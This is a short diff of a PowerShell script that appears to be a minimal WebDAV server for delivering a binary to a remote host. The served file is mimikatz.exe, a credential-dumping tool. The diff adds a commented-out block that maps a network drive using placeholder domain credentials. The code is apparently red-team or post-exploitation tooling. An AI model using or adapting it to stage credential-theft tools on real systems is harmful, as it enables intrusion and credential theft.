@@ -10,6 +10,10 @@
 #>
 
 $Server = '127.0.0.1' #Listening IP. Change This.
+<#
+$net = new-object -ComObject WScript.Network
+$net.MapNetworkDrive("r:", "\\127.0.0.1\drive", $true, "domain\user", "password")
+#>
 
 #JE-WEBDAV Just Enough WebDAV to allow you to map drive to get a binary back to host:)
 [byte[]] $File = [System.IO.File]::ReadAllBytes('C:\Tools\mimikatz.exe')
